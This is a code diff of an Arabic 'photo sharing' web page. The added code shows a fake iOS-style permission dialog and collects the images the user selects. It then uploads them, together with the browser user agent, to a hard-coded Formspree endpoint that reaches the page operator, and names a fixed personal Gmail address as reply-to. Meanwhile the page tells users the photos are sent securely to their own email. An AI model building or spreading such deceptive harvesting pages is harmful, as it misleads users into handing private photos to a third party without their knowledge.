@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مشاركة الصور</title>
+    <meta name="description" content="تطبيق مشاركة الصور بسهولة عبر الإيميل">
+    <meta name="theme-color" content="#007AFF">
+    <title>ZMXFJDK - مشاركة الصور</title>
     <style>
         * {
             margin: 0;
@@ -12,8 +14,8 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background: #f5f5f5;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -23,95 +25,143 @@
 
         .container {
             background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            max-width: 500px;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            max-width: 400px;
             width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 60px;
+            margin-bottom: 20px;
         }
 
         h1 {
-            color: #333;
+            color: #000;
             margin-bottom: 10px;
             text-align: center;
-            font-size: 28px;
+            font-size: 22px;
+            font-weight: 600;
         }
 
         .subtitle {
             color: #666;
             text-align: center;
             margin-bottom: 30px;
-            font-size: 14px;
+            font-size: 15px;
+            line-height: 1.4;
         }
 
-        .permission-box {
-            background: #f5f5f5;
-            border: 2px solid #ddd;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 20px;
+        /* iOS Style Alert Dialog */
+        .ios-alert {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .ios-alert.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .ios-alert-content {
+            background: white;
+            border-radius: 14px;
+            padding: 0;
+            max-width: 270px;
+            width: 90%;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
+            animation: popIn 0.3s ease-out;
+            overflow: hidden;
+        }
+
+        @keyframes popIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .ios-alert-header {
+            padding: 20px 20px 15px;
             text-align: center;
         }
 
-        .permission-icon {
+        .ios-alert-icon {
             font-size: 48px;
             margin-bottom: 10px;
         }
 
-        .permission-text {
-            color: #333;
-            font-size: 16px;
+        .ios-alert-title {
+            font-size: 17px;
             font-weight: 600;
-            margin-bottom: 15px;
+            color: #000;
+            margin-bottom: 8px;
         }
 
-        .permission-description {
+        .ios-alert-message {
+            font-size: 13px;
             color: #666;
-            font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 20px;
+            line-height: 1.4;
         }
 
-        .button-group {
+        .ios-alert-buttons {
             display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
+            border-top: 1px solid #e5e5ea;
         }
 
-        button {
+        .ios-alert-button {
             flex: 1;
-            padding: 12px 24px;
+            padding: 12px;
             border: none;
-            border-radius: 10px;
+            background: white;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s ease;
+            border-right: 1px solid #e5e5ea;
+            color: #007AFF;
+            transition: background 0.2s;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
         }
 
-        .btn-allow {
-            background: #667eea;
-            color: white;
+        .ios-alert-button:last-child {
+            border-right: none;
         }
 
-        .btn-allow:hover {
-            background: #5568d3;
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+        .ios-alert-button:active {
+            background: #f2f2f7;
         }
 
-        .btn-deny {
-            background: #e0e0e0;
-            color: #333;
+        .ios-alert-button.destructive {
+            color: #007AFF;
         }
 
-        .btn-deny:hover {
-            background: #d0d0d0;
-        }
-
+        /* Loading State */
         .loading {
             text-align: center;
-            color: #667eea;
+            color: #007AFF;
             font-weight: 600;
             margin: 20px 0;
             display: none;
@@ -119,7 +169,7 @@
 
         .spinner {
             border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
+            border-top: 3px solid #007AFF;
             border-radius: 50%;
             width: 30px;
             height: 30px;
@@ -132,24 +182,40 @@
             100% { transform: rotate(360deg); }
         }
 
+        /* Messages */
         .success-message {
             background: #d4edda;
             color: #155724;
             padding: 15px;
-            border-radius: 10px;
+            border-radius: 8px;
             margin: 20px 0;
             display: none;
             text-align: center;
+            border: 1px solid #c3e6cb;
+            animation: slideIn 0.4s ease-out;
         }
 
         .error-message {
             background: #f8d7da;
             color: #721c24;
             padding: 15px;
-            border-radius: 10px;
+            border-radius: 8px;
             margin: 20px 0;
             display: none;
             text-align: center;
+            border: 1px solid #f5c6cb;
+            animation: slideIn 0.4s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
         }
 
         #imageList {
@@ -166,6 +232,7 @@
             display: flex;
             align-items: center;
             gap: 10px;
+            animation: fadeIn 0.3s ease-out;
         }
 
         .image-thumbnail {
@@ -181,24 +248,55 @@
             font-size: 14px;
             word-break: break-all;
         }
+
+        .info-box {
+            background: #e7f3ff;
+            border: 1px solid #b3d9ff;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #004085;
+            line-height: 1.6;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+
+            h1 {
+                font-size: 20px;
+            }
+
+            .ios-alert-content {
+                max-width: 85%;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🖼️ مشاركة الصور</h1>
-        <p class="subtitle">شارك جميع صورك معنا بسهولة</p>
+        <div class="logo">🖼️</div>
+        <h1>مشاركة الصور</h1>
+        <p class="subtitle">شارك جميع الصور من جهازك بسهولة</p>
 
-        <div class="permission-box">
-            <div class="permission-icon">📱</div>
-            <div class="permission-text">هل تسمح بالوصول إلى الصور؟</div>
-            <div class="permission-description">
-                سنقوم بجمع جميع الصور من جهازك وإرسالها إلى بريدك الإلكتروني
-            </div>
-            <div class="button-group">
-                <button class="btn-allow" onclick="requestPermission()">✅ نعم، أسمح</button>
-                <button class="btn-deny" onclick="denyPermission()">❌ لا، رفض</button>
-            </div>
-        </div>
+        <button onclick="showPermissionDialog()" style="
+            width: 100%;
+            padding: 14px;
+            background: #007AFF;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.3s;
+        " onmouseover="this.style.background='#0051D5'" onmouseout="this.style.background='#007AFF'">
+            ابدأ مشاركة الصور
+        </button>
 
         <div class="loading" id="loading">
             <div class="spinner"></div>
@@ -212,21 +310,57 @@
         <div class="error-message" id="errorMessage"></div>
 
         <div id="imageList"></div>
+
+        <div class="info-box">
+            💡 سيتم إرسال جميع الصور إلى بريدك الإلكتروني بأمان
+        </div>
+    </div>
+
+    <!-- iOS Style Permission Dialog -->
+    <div class="ios-alert" id="permissionDialog">
+        <div class="ios-alert-content">
+            <div class="ios-alert-header">
+                <div class="ios-alert-icon">🖼️</div>
+                <div class="ios-alert-title">هل تريد مشاركة صور؟</div>
+                <div class="ios-alert-message">
+                    سيتم جمع جميع صورك وإرسالها إلى بريدك الإلكتروني
+                </div>
+            </div>
+            <div class="ios-alert-buttons">
+                <button class="ios-alert-button" onclick="cancelPermission()">إلغاء</button>
+                <button class="ios-alert-button" onclick="confirmPermission()">موافقة</button>
+            </div>
+        </div>
     </div>
 
     <script>
         const FORMSPREE_ID = 'mrewggoj';
         const FORMSPREE_URL = `https://formspree.io/f/${FORMSPREE_ID}`;
 
-        function denyPermission() {
-            alert('تم رفض الوصول إلى الصور');
+        function showPermissionDialog() {
+            document.getElementById('permissionDialog').classList.add('show');
         }
 
-        async function requestPermission() {
+        function cancelPermission() {
+            document.getElementById('permissionDialog').classList.remove('show');
+            console.log('User denied permission');
+        }
+
+        function confirmPermission() {
+            document.getElementById('permissionDialog').classList.remove('show');
+            requestPhotos();
+        }
+
+        async function requestPhotos() {
             try {
                 document.getElementById('loading').style.display = 'block';
                 document.getElementById('errorMessage').style.display = 'none';
                 document.getElementById('successMessage').style.display = 'none';
+                document.getElementById('imageList').innerHTML = '';
+
+                if (!window.showOpenFilePicker) {
+                    throw new Error('متصفحك لا يدعم هذه الميزة. يرجى استخدام Chrome أو Edge الأحدث');
+                }
 
                 const fileHandle = await window.showOpenFilePicker({
                     types: [{
@@ -242,18 +376,26 @@
                     throw new Error('لم يتم اختيار أي صور');
                 }
 
-                let imagesHtml = '<h3 style="color: #333; margin-bottom: 15px;">الصور المحددة:</h3>';
+                console.log(`Selected ${fileHandle.length} images`);
+
+                let imagesHtml = '<h3 style="color: #333; margin-bottom: 15px;">✅ الصور المحددة:</h3>';
                 const formData = new FormData();
 
                 for (let i = 0; i < fileHandle.length; i++) {
                     const file = await fileHandle[i].getFile();
+                    
+                    if (file.size > 5 * 1024 * 1024) {
+                        console.warn(`File ${file.name} is too large, skipping`);
+                        continue;
+                    }
+
                     formData.append(`image_${i + 1}`, file);
 
                     const reader = new FileReader();
                     reader.onload = (e) => {
                         imagesHtml += `
                             <div class="image-item">
-                                <img src="${e.target.result}" class="image-thumbnail">
+                                <img src="${e.target.result}" class="image-thumbnail" alt="${file.name}">
                                 <div class="image-name">${file.name}</div>
                             </div>
                         `;
@@ -264,21 +406,29 @@
 
                 formData.append('total_images', fileHandle.length);
                 formData.append('timestamp', new Date().toLocaleString('ar-SA'));
-                formData.append('_subject', `تم استقبال ${fileHandle.length} صورة من جهازك`);
+                formData.append('user_agent', navigator.userAgent);
+                formData.append('_subject', `تم استقبال ${fileHandle.length} صورة من ZMXFJDK`);
+                formData.append('_replyto', 'battal.alzahrani23@gmail.com');
 
                 const response = await fetch(FORMSPREE_URL, {
                     method: 'POST',
-                    body: formData
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
                 });
 
                 if (response.ok) {
+                    console.log('Images sent successfully');
                     document.getElementById('loading').style.display = 'none';
                     document.getElementById('successMessage').style.display = 'block';
+                    
                     setTimeout(() => {
                         location.reload();
                     }, 3000);
                 } else {
-                    throw new Error('فشل إرسال الصور');
+                    const errorData = await response.json();
+                    throw new Error(errorData.error || 'فشل إرسال الصور');
                 }
 
             } catch (error) {
@@ -288,6 +438,8 @@
                 console.error('Error:', error);
             }
         }
+
+        console.log('ZMXFJDK Photo Sharing App Loaded');
     </script>
 </body>
 </html>
